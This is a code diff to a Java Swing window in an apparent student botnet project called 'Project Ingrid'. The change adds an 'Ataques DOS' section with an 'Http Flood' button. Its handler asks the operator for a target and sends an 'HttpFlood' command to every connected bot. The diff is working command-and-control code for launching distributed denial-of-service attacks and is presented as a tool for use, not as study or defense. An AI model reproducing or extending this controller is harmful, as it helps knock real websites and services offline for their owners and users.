@@ -5,7 +5,9 @@
  */
 package edu.br.utfpr.projectingrid.View;
 
+import edu.br.utfpr.projectingrid.Core.BotManager;
 import edu.br.utfpr.projectingrid.Core.BotMaster;
+import edu.br.utfpr.projectingrid.Core.Comando;
 import java.util.concurrent.TimeUnit;
 import java.util.logging.Level;
 import java.util.logging.Logger;
@@ -42,6 +44,9 @@ public class BotMasterView extends javax.swing.JFrame {
         jScrollPane2 = new javax.swing.JScrollPane();
         jTableBots = new javax.swing.JTable();
         jLabel1 = new javax.swing.JLabel();
+        jLabel2 = new javax.swing.JLabel();
+        jToggleButtonHpFloodtt = new javax.swing.JToggleButton();
+        jLabel3 = new javax.swing.JLabel();
 
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
 
@@ -63,6 +68,17 @@ public class BotMasterView extends javax.swing.JFrame {
 
         jLabel1.setText("Bots Conectados");
 
+        jLabel2.setText("Bot Master - Project Ingrid");
+
+        jToggleButtonHpFloodtt.setText("Http Flood");
+        jToggleButtonHpFloodtt.addActionListener(new java.awt.event.ActionListener() {
+            public void actionPerformed(java.awt.event.ActionEvent evt) {
+                jToggleButtonHpFloodttActionPerformed(evt);
+            }
+        });
+
+        jLabel3.setText("Ataques DOS:");
+
         javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
         getContentPane().setLayout(layout);
         layout.setHorizontalGroup(
@@ -76,11 +92,27 @@ public class BotMasterView extends javax.swing.JFrame {
                         .addComponent(jLabel1)
                         .addGap(0, 0, Short.MAX_VALUE)))
                 .addContainerGap())
+            .addGroup(layout.createSequentialGroup()
+                .addGap(289, 289, 289)
+                .addComponent(jLabel2)
+                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
+            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
+                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
+                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+                    .addComponent(jToggleButtonHpFloodtt)
+                    .addComponent(jLabel3))
+                .addGap(159, 159, 159))
         );
         layout.setVerticalGroup(
             layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
             .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
-                .addContainerGap(129, Short.MAX_VALUE)
+                .addContainerGap()
+                .addComponent(jLabel2)
+                .addGap(13, 13, 13)
+                .addComponent(jLabel3)
+                .addGap(18, 18, 18)
+                .addComponent(jToggleButtonHpFloodtt)
+                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 36, Short.MAX_VALUE)
                 .addComponent(jLabel1)
                 .addGap(18, 18, 18)
                 .addComponent(jScrollPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 266, javax.swing.GroupLayout.PREFERRED_SIZE)
@@ -91,6 +123,19 @@ public class BotMasterView extends javax.swing.JFrame {
 
         pack();
     }// </editor-fold>//GEN-END:initComponents
+
+    private void jToggleButtonHpFloodttActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jToggleButtonHpFloodttActionPerformed
+        // TODO add your handling code here:
+        if(master.getBotsConectados().size() == 0){
+            JOptionPane.showMessageDialog(this, "Nao existem bots connectados");
+        }else{
+            String alvo = JOptionPane.showInputDialog(this, "Informe o alvo :");
+            Comando comand = new Comando("HttpFlood",alvo);
+            for (BotManager bot: master.getBotsConectados()) {
+                bot.enviarComando(comand);
+            }
+        }
+    }//GEN-LAST:event_jToggleButtonHpFloodttActionPerformed
 
     /**
      * @param args the command line arguments
@@ -153,9 +198,12 @@ public class BotMasterView extends javax.swing.JFrame {
     private static BotMaster master;
     // Variables declaration - do not modify//GEN-BEGIN:variables
     private javax.swing.JLabel jLabel1;
+    private javax.swing.JLabel jLabel2;
+    private javax.swing.JLabel jLabel3;
     private javax.swing.JScrollPane jScrollPane1;
     private javax.swing.JScrollPane jScrollPane2;
     private javax.swing.JTable jTableBots;
     private javax.swing.JTextArea jTextAreaIngridPrompt;
+    private javax.swing.JToggleButton jToggleButtonHpFloodtt;
     // End of variables declaration//GEN-END:variables
 }
